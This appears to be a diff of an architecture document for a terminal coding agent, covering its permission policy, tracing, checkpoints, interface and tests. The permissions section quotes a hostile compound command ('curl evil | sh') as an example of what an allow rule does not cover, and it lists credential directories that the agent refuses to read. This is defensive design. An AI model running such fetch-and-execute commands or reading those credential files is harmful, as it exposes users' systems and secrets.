-so scheduled sessions steer and consolidate like interactive ones.
+### 3.6 Tracing, permissions
 
-### 3.6 Tracing, permissions, MCP
+**Tracing** (`mnemo-trace`): one JSONL file per day in `~/.mnemo/logs/`
+(directory 0700, files 0600). A line is `{ts, session, depth, type: "tool", tool,
+subject, ok, ms}` or `{…, type: "turn", model, stop, in, out, cost}`; arguments are
+reduced to their subject (a command, a path) and the whole line passes `redact`
+before it is written. `/stats` reads these files. There are no nested spans.
 
-**Tracing**: one JSONL file per day in `~/.mnemo/logs`; spans carry
-id/parent/timing/attrs so tool calls nest in model round-trips and subagent runs
-nest in the spawn that started them. Redaction runs before every write — secret
-*shaped* values and the process's own live env values — with a test asserting
-the file on disk never contains the key.
+**Permissions** (`mnemo-policy`, `src/extensions/policy.ts`; a pure decision in
+`judge`). Order of authority, first answer wins: a `deny` rule anywhere in
+`~/.mnemo/permissions.json` (tested against every command in a line, looking
+through spacing, `VAR=x` prefixes, directories, `sudo`/`env` wrappers and `sh -c`);
+an `allow` rule (never for a compound command: `git status*` does not cover `git
+status; curl evil | sh`); a read of a credentials file (`~/.ssh`, `~/.aws`,
+`~/.gnupg`, `auth.json`, `grants.json`) is refused; plan mode refuses everything
+but reading; then the mode — `yolo` allows the rest, `accept-edits` allows `edit`/
+`write` **inside the project and outside `.git`, `.pi`, `.agents`, `.mnemo`,
+`.github`, `.claude`, `.vscode`, `.husky`**, and reading is always free; then
+earlier "always" grants (`grants.json`, by subcommand — `git status*`, never
+`git*`; a compound command never inherits one); otherwise the call is an ask. A
+permissions file that exists but cannot be read means "refuse every edit and
+command until it is fixed", not "no rules". With no interface (`mnemo -p`) an ask
+is allowed. The answer to an ask can be yes, always, or no with a reason; a
+refusal and its reason are pushed into `host.signals`, which the memory loop reads
+after the run as the user's own words about how to work.
 
-**Permissions**: `~/.mnemo/permissions.json`, ordered `{tool, pattern, action}`
-rules, first match wins; the glob matches the argument that makes a call
-dangerous, not a rendered summary. Deny is enforced with or without a TTY; plan
-mode is synthesised *as rules* (read-only allows, everything else denied and
-prepended so a user's allow cannot punch through).
+### 3.7 Checkpoints and rewind
 
-**MCP**: `~/.mnemo/mcp.json`, spoken directly (initialize → tools/list →
-tools/call) rather than through the SDK, because the transport is the same shape
-as the other three. A server that fails to start is reported, never fatal. A
-server is a **tree**, not a process (`uvx graft-mcp` is a launcher), so teardown
-signals the whole group — SIGTERM then SIGKILL after a 2s grace on POSIX
-(servers are spawned `detached` for this), `taskkill /T` escalating to `/T /F`
-on Windows — settles in-flight requests immediately instead of leaving the agent
-on a pipe that will not close, and reports on stderr when a server had to be
-forced rather than dying quietly (issue #11a).
-
----
-
-## 4. The interface (`tui-go/`, legacy)
-
-> This section describes the Go interface. Its replacement is `app/` (Bun); the
-> rules below (one owner for layout, re-arm the backend, one command list) are
-> design lessons that carry over, the package map does not. See `docs/ROADMAP.md`
-> Stage 1 and `docs/REBUILD.md`.
-
-One Elm-style loop, one root model, sub-models that own their state. Package
-map: `theme` (palette/glyphs/styles — nothing else names a colour), `brand`
-(mascot + wordmark as marker strings), `tree` (one hierarchy used by folders,
-sessions and memories), `chat` (the transcript: blocks, folding, focus,
-wrapping, search), `ui` (rules, bands, chips), `keymap` (every binding; help and
-the palette render from it), `overlay` (one modal contract), `session` (pi's
-stored sessions), `filetree`, `prompt`, `agent` (the backend boundary),
-`pi` (RPC behind it), `markdown` (glamour + cache keyed by content width and
-line count).
-
-Two structural rules. **One owner for layout math**: `app/view.go`'s `rows()`
-computes every region boundary in one place — two functions computing it
-separately disagreed by one row once, and click hit-testing plus the cursor both
-broke. **`Next()` re-arms the backend**: the agent is driven by being asked for
-its next message, and every branch that handles an agent message re-arms it, in
-one place — forgetting once stops the stream with no error anywhere.
-
-The command surface is one list (`internal/command`): built-ins with their
-chords, skills/plugins/harness bundles discovered on disk, and — on a live
-session — whatever pi answers to `get_commands`, merged rather than substituted.
-An unknown name with a live backend is routed to pi verbatim (that is what
-executes an extension command and expands a prompt template); with no backend,
-the refusal stands. `--dump` renders a frame to stdout for tests and
-screenshots, and `app/testdata/golden/*.txt` pins four scenarios byte-for-byte
-(text only — colour is not part of the contract, and the frames are LF
-everywhere via `.gitattributes`).
+Before the first `edit` or `write` of a file in a turn, `mnemo-checkpoints` keeps
+the file's bytes (or the fact that it did not exist) in `Checkpoints`
+(`runtime/checkpoints.ts`), filed under that turn's user message — the id of its
+session entry. A sub-agent's edits go to its parent's turn. `Controller.rewind`
+(`esc esc` on an empty prompt, `/rewind`) lists the user messages of the current
+branch with how many files changed since each, and offers "the conversation and the
+files", "the conversation only" or "only the files". Restoring writes back, or
+removes, every file any later turn touched, to the state the *earliest* of those
+turns found it in; the conversation moves to that point with `navigateTree` (the
+later turns stay on their own branch of the session tree) and the message returns
+to the prompt. Shell commands are not seen, and the record is in memory only, so it
+lasts as long as the process. A rewind is refused while a turn is running.
 
 ---
 
-## 5. The harness engine (`harness-engine/`)
+## 4. The interface (`app/src/ui/`)
 
-A bundle is a directory: `manifest.json` plus `tools/*.mjs`, each module
-default-exporting `{name, description, schema, execute}`. `loadBundle` is the
-single gated entry point every caller goes through (create, watcher, CLI), so a
-bundle that appears on disk is gated as hard as one created through the API. The
-gate scans static/dynamic imports and `require`, rejects non-literal specifiers,
-blocks `fs`/`child_process`/net-class/host-info modules, rejects direct
-`process` access, confines relative imports to the bundle directory (lexically
-and after realpath, depth 3), and syntax-checks before import — fail-closed
-everywhere. It does **not** sandbox, and it never will: it filters what loads.
+Ink 8 + React 19 on Bun. The design spec is `DESIGN.md`; this is the structure.
+`Controller` (§3.1) owns the transcript, the dialog queue and the chrome state; the
+components read snapshots (`useSyncExternalStore`) and call methods on it.
 
-Execution is the other half, and it is a real boundary now (issue #7). In
-`execution: "child"` — the default for `createHarness`, the watcher and the CLI
-— the host never evaluates bundle code at all: a child process is asked to
-describe each tool, and every `execute()` is another child, with an explicit
-environment allowlist (no API keys; credential- and injection-shaped names are
-refused even if allowlisted), a cwd jailed to the bundle directory, a
-wall-clock timeout that ends the process TREE (SIGTERM → SIGKILL;
-`taskkill /T` → `/T /F`), and stdout/stderr captured and byte-capped. That is
-**blast-radius control and secret hiding, not isolation**: the child is the same
-user, with the same filesystem and network reach, and the timeout bounds wall
-clock rather than memory or CPU. The full statement of what is and is not
-prevented — and why a child process rather than a worker or a container — lives
-in `harness-engine/README.md`, "Execution boundary". The registry layers
-session/project/global scopes with the nearest winning, shadows loudly via
-`ShadowEvent`, and the watcher re-gates
-on rewrite.
+Map: `store.ts` (the transcript as data: pi events in, blocks out; `committed`
+blocks are final and printed once into the scrollback in the inline layout, `live`
+blocks are redrawn), `editor.ts` (the prompt's text and cursor as pure functions),
+`format.ts` (how a tool call is titled, summarised and previewed), `activity.ts`
+(one outcome per turn for the timeline and the hub, test counts for the heatmap),
+`theme.ts` (the only file that names a colour or a glyph: eleven palettes,
+`applyTheme`; every theme is tested for complete roles and readable contrast, and
+all but Mnemo Night paint their own ground), `pixel.ts` (two pixels per cell:
+`▀` with a foreground and a background), `engram.ts` (the field of glyphs Mne
+settles out of: a frame is a pure function of size, time and seed, in four
+variations — `hero`, `boot`, `welcome`, `ambient`), `link.ts` (OSC 8),
+`notify.ts` (OSC 9 and a bell when a turn over 20 s ends, or an approval waits,
+while the terminal reports it is out of focus), `mouse.ts` (the wheel, SGR
+reports). Screens, outermost in: `Root` (the launch sequence `Boot`, the
+five-page `Onboarding` on a first run or `--intro`, then the main screen — all
+full terminal), `Shell` (every agent of the process: `agent`, `split` of up to
+four, or `hub`, with the keys listed in `MNEMO.md` §4; each agent's workspace stays
+mounted so a draft, a scroll position or an open dialog survives moving between
+them), `Workspace` (header, sidebar, main area, composer; focus is one of
+composer, sidebar, main), `App` (the inline layout, `--inline` and anything that
+is not a terminal), `ExitCard` (the goodbye screen), `Toasts` (what happens in
+agents you are not looking at). `runtime/fleet.ts` is the set of agents: each its
+own project, pi session, host and controller, sharing one memory sidecar and the
+credentials.
+
+Structural rules, each a failure that has already happened. **Pure frames**: the
+launch, Engram, the dither and the pulse are functions of time (`bootFrame`,
+`engramFrame`, `ditherFrame`), so a test or a snapshot can ask for any moment;
+without motion (`--no-motion`, a dump, a pipe) the settled frame is shown.
+**Fit the space you were given**: a component takes its width and height from the
+window (or from its split pane) and clips to them; the workspace measures its body
+rather than assuming a row count, and a stale measurement was the cause of a gap
+or overlap after a resize. **Mounted, not remounted**: when a dialog needs the
+rows, the composer is hidden (`display: none`), not unmounted, so the draft
+survives.
+
+The command surface is one list: `BUILTINS` in `controller.ts` (`/help` is
+generated from it), merged with the commands pi extensions register, pi's prompt
+templates and skills (`controller.commands()`). A name that is none of them goes to
+the agent as a message. Commands that take no words run as picked in the `ctrl+k`
+palette (`RUN_AS_PICKED` in `Workspace.tsx`); the rest are put in the prompt.
+`web/src/content/commands.ts` is the documented copy of the commands, keys and
+environment variables, "generated from the app, then edited by hand": change it
+with the app. `mnemo --demo --dump` renders one frame after a scripted turn; the
+UI tests use `ink-testing-library` and assert on data (`store.ts`) where they can.
 
 ---
+
+## 5. What the previous stack had that the app does not
+
+The Go interface, the Node agent and the harness engine are on the `legacy` branch
+(`docs/LEGACY.md`). Not ported: the
+hooks engine (`.mnemo/hooks/`), the schedule daemon and triggers, MCP servers as
+agent tools (`~/.mnemo/mcp.json`), harness bundles and `create_harness` (the gated,
+child-process bundle loader), `~/.mnemo/tools.json`, `patch_skill`/`retire_skill`
+(`update_skill` and the memory loop's patch replace them), `mnemo traces`, `mnemo consolidate`, `mnemo init` and
+`mnemo pr`. What carries over is the design lessons — the invariants below.
 
 ## 6. Invariants
 
@@ -436,7 +535,7 @@ These decide design questions before they are asked:
 4. **Memory never breaks the loop.** Every memory call is try/caught; a missing
    sidecar degrades to "no memory" and says so.
 5. **Config is a parameter, never a lookup.** `home`, `cwd`, journal and sidecar
-   paths are fields on `Config`/options, because a function that finds its own
+   paths are fields on `Host`/options (`MemoryService(binary, journal)`, `mnemoHome(env)`), because a function that finds its own
    home finds the developer's in a test.
 6. **Prompt caching is a resource.** The tool list and system prompt are the
    cached prefix; changing them mid-session is a bug, not a feature.
@@ -451,18 +550,24 @@ These decide design questions before they are asked:
 
 | Suite | Command | Notes |
 |---|---|---|
-| agent | `cd agent && npm test` (~389) + `npx tsc --noEmit` | fake pi event streams, injected temp homes, real memsrv over temp journals |
-| memory-layer | `cd memory-layer && cargo test` (75 lib + integration) | concurrency, replay exactness, eval pins |
-| tui-go | `cd tui-go && go test ./...` (20 packages) + `go vet` | golden frames, width sweeps, scripted backends |
-| harness-engine | `cd harness-engine && npm test` | bundle lifecycle, gate rejections, watcher |
+| app | `cd app && bun test --timeout 30000 ./test` (235 tests, 37 files) + `bunx tsc --noEmit` | whole turns on pi-ai's faux provider, injected temp homes, real `memsrv` over temp journals (skipped, with a message, when it is not built), rendered frames through `ink-testing-library` |
+| memory package | `cd packages/memory && bun test ./test` (43 tests, 13 files) + `bunx tsc --noEmit` | the real sidecar; redaction, safety, hooks, MCP, ingest, session index |
+| memory-layer | `cd memory-layer && cargo test` (85 lib tests + 28 integration tests over nine files) | concurrency, replay exactness, RPC behaviour, the retrieval gate and the constraint probe |
 
-CI (`.github/workflows/ci.yml`) runs all four, the TUI suite on ubuntu + macos +
-windows, and a credential-shaped-string scan of the working tree and the last
-200 commits with an explicit exclusion list for redaction fixtures. Fixtures
-follow two rules learned the hard way: **no shell scripts** (the stand-in
-sidecars are the test binary re-executed with a JSON spec) and **no reliance on
-POSIX permissions** (the unreadable-directory test uses a path that is not a
-directory on Windows).
+`memory-layer/tests/ann_probe.rs` is a measurement probe, not a test: it is
+described as temporary, and it runs for many minutes under `cargo test`, so the
+counts above leave it out.
+
+CI (`.github/workflows/ci.yml`) runs the memory-layer suite, the retrieval gate
+(`memeval_gate`) and, for the app, typecheck + `bun test` + the memory package's
+typecheck and tests on ubuntu, macos **and** windows, then builds the compiled binary
+and checks that `--demo --dump` renders a frame. A separate job scans the working
+tree and the last 200 commits for credential-shaped strings, with an explicit
+exclusion list for the redaction fixtures (`packages/memory/test/redact.test.ts`,
+`app/test/scrub.test.ts`). Fixtures follow the rules in `AGENTS.md`, each learned the
+hard way: **no shell scripts** (`#!/bin/sh` is unrunnable on Windows), **compare real
+paths** (macOS `/var` vs `/private/var`, Windows 8.3 names), and **LF line endings
+everywhere** (`.gitattributes`).
 
 ---
 
@@ -470,56 +575,38 @@ directory on Windows).
 
 | To add… | Touch |
 |---|---|
-| a tool | `agent/src/tools/<name>.ts`, export it in `index.ts`, register in `sea-tools-inline.ts` |
-| a slash command (interface) | `tui-go/internal/command` built-ins + a case in `app/update.go`'s `runSlash` |
-| a slash command (agent) | `pi.registerCommand` in an extension — it appears in the palette automatically once surfaced by `get_commands` |
+| a tool | `defineTool` in an extension under `app/src/extensions/`, registered in `mnemoExtensions` (`index.ts`); add its name to the `READ`/`EDIT`/`EXEC` sets in `extensions/policy.ts`, or the gate treats it as an unknown kind and asks |
+| a slash command (interface) | `BUILTINS` in `runtime/controller.ts` + a case in `builtin()`; `RUN_AS_PICKED` in `ui/workspace/Workspace.tsx` if it takes no words; the copy in `web/src/content/commands.ts` |
+| a slash command (agent) | `pi.registerCommand` in an extension — it appears in the menu and the palette through `getRegisteredCommands()` |
 | a memory area | `Area` in `memory-layer/src/model.rs` + `route_query` cues + `Area::for_kind` |
-| a memory heuristic | a pure planner in `memory-layer/src/` returning `Vec<Op>`, exposed as an `memsrv` method |
-| a UI overlay | `internal/overlay` + a case in `chooseOverlay`; render from `keymap` so help cannot drift |
-| a hook | a manifest in `.mnemo/hooks/`, or `/hook add` |
-| a scheduled job | `mnemo schedule add …` or `~/.mnemo/schedules.json` |
-| a prompt template | a `.md` in `~/.pi/agent/prompts/` or `.pi/prompts/` — pi expands `/<filename>` before the prompt is sent, so it appears in the palette once `get_commands` answers |
-| a third-party pi extension | `~/.pi/agent/extensions/*.ts`, `.pi/extensions/*` — the path that needs no PR to Mnemo (see below) |
-| a background memory job | `research/memory-runtime-design.md` (designed, not built) |
+| a memory heuristic | a pure planner in `memory-layer/src/` returning `Vec<Op>`, exposed as a `memsrv` method |
+| a theme | an entry in `THEMES` and `ThemeName` in `ui/theme.ts` (the contrast test covers it), and the `/theme` description in `controller.ts` |
+| a dialog | `controller.dialogs.select`/`text`/… (`runtime/dialogs.ts`), drawn by `ui/components/Dialogs.tsx` |
+| a sidebar pane | `PANES` in `ui/workspace/model.ts`, the rows from `runtime/workspace-source.ts`, its icon in `Sidebar.tsx` |
+| a prompt template | a `.md` in `~/.mnemo/agent/prompts/` or `.pi/prompts/` — pi expands `/<filename>` before the prompt is sent |
+| a third-party pi extension | `~/.mnemo/agent/extensions/*.ts`, or `.pi/extensions/*` in a project once it is trusted — the path that needs no PR to Mnemo |
+| memory for another agent | `mnemo memory setup <agent>` (hooks, MCP); a new transcript format goes in `packages/memory/src/ingest/` |
+| a background memory job | `research/memory-runtime-design.md` (designed; the curator is on `feature/background-curator`) |
 
 ### A stranger's extension: pi's on-disk path
 
-Mnemo's own six extensions are **inline** — shipped with the binary, no per-user
-install, identical in every mode. The third-party path is pi's, and it is a
-directory, not a PR:
+Mnemo's own nine extensions are **inline** — shipped with the binary. The
+third-party path is pi's, and it is a directory, not a PR:
 
 | Where | Scope |
 |---|---|
-| `~/.pi/agent/extensions/*.ts`, `~/.pi/agent/extensions/*/index.ts` | global — every project |
-| `.pi/extensions/*.ts`, `.pi/extensions/*/index.ts` | project-local, once the project is trusted (#17) |
+| `~/.mnemo/agent/extensions/*.ts`, `*/index.ts` | global — every project |
+| `.pi/extensions/*.ts`, `*/index.ts` | project-local, only once the folder is trusted (`--trust-project`, or "always" at the launch prompt) |
 
-`pi -e ./path.ts` is for quick tests and is not reloadable; the two directories
-above are what `/reload` watches (pi's `docs/extensions.md`). An extension may
-register tools, commands, hook handlers and UI requests, and everything it
-registers arrives through the same `get_commands` answer the palette already
-reads — so it needs no change here to be visible or runnable (P2, #18).
-
-Verified against the installed pi rather than assumed (2026-09-17): an extension
-at `<agent dir>/extensions/demo/index.ts` registering one command answered first
-in `get_commands` with `source: "extension"`, `sourceInfo.path` = its own file and
-`scope: "user"`, under Mnemo's own spawn argv (no `-ne`) — so a command from a
-file a stranger wrote reaches `^k` as a row with its path, and `/stranger-demo`
-routes to pi verbatim.
-
-Two costs of courting that path, both measured rather than hypothetical:
-
-- **Two extensions claiming one tool name make pi refuse to start.** Reproduced in
-  issue #13 (which is why the child's stderr is now captured and shown as one
-  transcript notice); Mnemo loads user extensions — it does not pass `-ne` — so the
-  `-ne` decision is still open, and it is P7's to make.
-- **Names Mnemo already claims**, which a third party must not reuse: the 16 tools
-  of `src/tools/index.ts`, `memory_search` / `memory_write_fact` / `memory_steer`,
-  `mcp__<server>__<tool>`, the commands `hook`, `schedule`, `trigger`, `now`, and
-  the inline extension names `sea-tools`, `sea-memory`, `sea-approval`,
-  `sea-tracing`, `sea-hooks`, `sea-schedules`. `web_search` and `web_fetch` are the
-  exception that proves the rule: Mnemo claims those only at `session_start`, and
-  only if nobody else has (pi kills the whole extension on a duplicate, so the
-  deferral is what keeps a package like `pi-web-access` installable).
+An extension may register tools, commands, hook handlers and UI requests. Names
+Mnemo already claims, which a third party must not reuse: the tools `ipy_run`,
+`memory_search`, `session_search`, `memory_remember`, `memory_steer`,
+`spawn_subagent`, `create_skill`, `update_skill` and `bash` (Mnemo re-registers
+pi's, to scrub the environment), and the extension names `mnemo-policy`,
+`mnemo-checkpoints`, `mnemo-shell`, `mnemo-memory`, `mnemo-kernel`, `mnemo-agents`,
+`mnemo-skills`, `mnemo-escalate`, `mnemo-trace`. What pi does with two extensions
+claiming one tool name is pi's behaviour, not tested here; the last time it was
+measured (on the previous stack) it refused to start the session.
 
 ---
 
@@ -531,13 +618,16 @@ Two costs of courting that path, both measured rather than hypothetical:
 - **A fixture that spawns a shell.** It works on the author's machine and takes
   a whole package down on Windows.
 - **CRLF in a byte-compared file.** `git status` cannot show it, because git
-  normalises before comparing; the golden frame test can.
+  normalises before comparing; a test that compares bytes (a rendered frame, an
+  installer run with `sh`) can.
 - **The sidecar's Windows name.** `memsrv` vs `memsrv.exe` is the difference
   between a working memory pane and one that silently reports nothing.
-- **A pinned Node that cannot strip types.** 22.6 shipped the feature behind a
-  flag; 22.18 is the floor, and CI pinned the wrong one for weeks.
-- **An unhandled EPIPE on a hook that never reads stdin** — the exit code *is*
-  the answer, and it was being thrown away with the write.
+- **A child's late exit.** A replaced interpreter's (or sidecar's) `exit` event
+  arrives after its replacement is already serving, and resolving the new one's
+  requests with the old one's death is a lie about the wrong process.
+- **A config file that cannot be read, read as "no rules".** It turns every deny
+  into nothing; a `permissions.json` that exists and cannot be understood refuses
+  every edit and command instead.
 - **A test that asserts exact equality on an approximate algorithm.** The ANN
   comparison is flaky by construction (issue #12).
 - **A gate that fails on its own fixtures.** A red security check is one people
